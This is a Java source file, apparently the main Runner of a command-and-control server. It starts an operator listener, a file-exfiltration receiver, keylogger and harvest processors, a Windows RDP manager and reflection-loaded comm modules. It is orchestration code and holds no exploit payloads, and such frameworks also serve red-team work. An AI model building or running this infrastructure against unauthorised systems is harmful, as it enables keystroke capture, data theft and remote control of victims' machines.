package c2;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Properties;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import c2.file.CommandLoadParser;
import c2.rdp.WindowsRDPManager;
import c2.session.CommandLoader;
import c2.session.CommandMacroManager;
import c2.session.IOManager;
import c2.session.SessionManager;
import c2.tcp.filereceiver.FileReceiverSessionReceiver;

public class Runner {
	public static void main(String args[]) throws InterruptedException, ExecutionException {

		try (InputStream input = new FileInputStream(args[0])) {

			Properties prop = new Properties();

			// load a properties file
			prop.load(input);

			Runner main = new Runner();
			main.engage(prop);

		} catch (IOException ex) {
			System.out.println("Unable to load config file");
		}

	}

	private ExecutorService service;
	private IOManager ioManager;
	private Properties properties;
	private KeyloggerProcessor keylogger;

	private List<C2Interface> interfaces = new ArrayList<>();
	private List<Future<?>> runningServiceFutures = new ArrayList<>();

	private CountDownLatch startupLatch = new CountDownLatch(1);
	private CountDownLatch deathLatch = new CountDownLatch(1);

	private HarvestProcessor harvester;

	public void awaitFullStartup() {
		try {
			startupLatch.await();
		} catch (InterruptedException e) {
			// meh, don't worry about it
		}
	}
	
	public void awaitFullShutdown() {
		try {
			deathLatch.await();
		} catch (InterruptedException e) {
			// meh, don't worry about it
		}
	}

	private void initializeCommServices() {
		String serviceListString = properties.getProperty(Constants.COMMSERVICES);
		String[] serviceClassNames = serviceListString.split(",");
		for (String className : serviceClassNames) {
			try {
				Class<?> c = Class.forName(className);
				Constructor<?> cons = c.getConstructor();
				Object object = cons.newInstance();
				C2Interface newModule = (C2Interface) object;
				engageInterface(newModule);
				interfaces.add(newModule);
			} catch (Exception ex) {
				System.out.println("Unable to load class: " + className);
				ex.printStackTrace();
			}
		}

	}

	private void notifyAllServicesForShutdown() {
		for (C2Interface in : interfaces) {
			in.notifyPendingShutdown();
		}
	}

	private void shutdownAllServices() {
		for (C2Interface in : interfaces) {
			in.stop();
			System.out.println("Shutting down service: " + in.getName());
		}
	}

	public void engage(Properties properties) {
		this.properties = properties;

		// Set up dynamic constants
		Constants theOnlyOne = Constants.getConstants();
		theOnlyOne.setMaxResponseWait(Integer.parseInt(properties.getProperty(Constants.DAEMONMAXRESPONSEWAIT)));
		theOnlyOne.setRepollForResponseInterval(
				Integer.parseInt(properties.getProperty(Constants.DAEMONRESPONSEREPOLLINTERVAL)));
		theOnlyOne.setTextOverTCPStaticWait(
				Integer.parseInt(properties.getProperty(Constants.DAEMONTEXTOVERTCPSTATICWAIT)));
		theOnlyOne.setExpectedMaxClientReportingInterval(
				Integer.parseInt(properties.getProperty(Constants.EXPECTEDMAXCLIENTREPORTINGINTERVAL)));
		theOnlyOne.setMultiplesOfExpectedMaxClientReportingToWait(
				Integer.parseInt(properties.getProperty(Constants.MULTIPLESEXPECTEDMAXCLIENTREPORTINGINTERVAL)));
		

		int listenPort = Integer.parseInt(properties.getProperty(Constants.COMMANDERPORT));
		System.out.println("Listening for instructions on: " + listenPort);
		service = Executors.newCachedThreadPool();

		CommandLoader cl;
		try {
			cl = new CommandLoadParser().buildLoader(properties.getProperty(Constants.HUBCMDDEFAULTS));
		} catch (Exception e) {
			System.out.println("Unable to start with specified defaults file: "
					+ properties.getProperty(Constants.HUBCMDDEFAULTS));
			cl = new CommandLoader(new HashMap<>(), new HashMap<>(), new ArrayList<>());
		}

		//TODO: Make configurable
		FileReceiverSessionReceiver receiver = new FileReceiverSessionReceiver(8010, Paths.get("test", "fileReceiverTest"));
		service.execute(receiver);
		
		ioManager = new IOManager(Paths.get(properties.getProperty(Constants.HUBLOGGINGPATH)), cl);

		keylogger = new KeyloggerProcessor();
		keylogger.initialize(properties.getProperty(Constants.DAEMONLZLOGGER));

		harvester = new HarvestProcessor(properties.getProperty(Constants.DAEMONLZHARVEST));

		// TODO make configurable
		WindowsRDPManager winManager = new WindowsRDPManager(ioManager, 40000, 15, ioManager.getCommandPreprocessor());
		try {
			winManager.startup();
		} catch (Exception e) {
			System.out.println("Unable to load prior Windows RDP information: " + e.getLocalizedMessage());
		}
		CommandMacroManager cmm = new CommandMacroManager(winManager, ioManager,
				properties.getProperty(Constants.DAEMONLZHARVEST));
		cmm.initializeMacros(properties);

		SessionManager sessionManager = new SessionManager(ioManager, listenPort, cmm);

		Future<?> session = service.submit(sessionManager);

		initializeCommServices();

		startupLatch.countDown();

		// Wait forever on these tasks
		try {
			session.get();
			for (Future<?> future : runningServiceFutures) {
				future.get();
			}
		} catch (InterruptedException ex) {
			notifyAllServicesForShutdown();
			keylogger.stop();
			System.out.println("Shutting down");
			service.shutdownNow();
			System.out.println("Stopping session manager");
			sessionManager.stop();
			System.out.println("Stopped session manager");
			winManager.teardown();
			System.out.println("Stopped RDP session manager");
			shutdownAllServices();
			System.out.println("Stopping File Exfiltration Receiver");
			receiver.kill();
			System.out.println("Teardown complete, all functions terminated");
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		deathLatch.countDown();
	}

	public void engageInterface(C2Interface in) {
		try {
			in.initialize(ioManager, properties, keylogger, harvester);
		} catch (Exception ex) {
			System.out.println("Failed to start service: " + in.getName());
			ex.printStackTrace();
		}
		runningServiceFutures.add(service.submit(in));
		System.out.println("Service online: " + in.getName());
	}
}
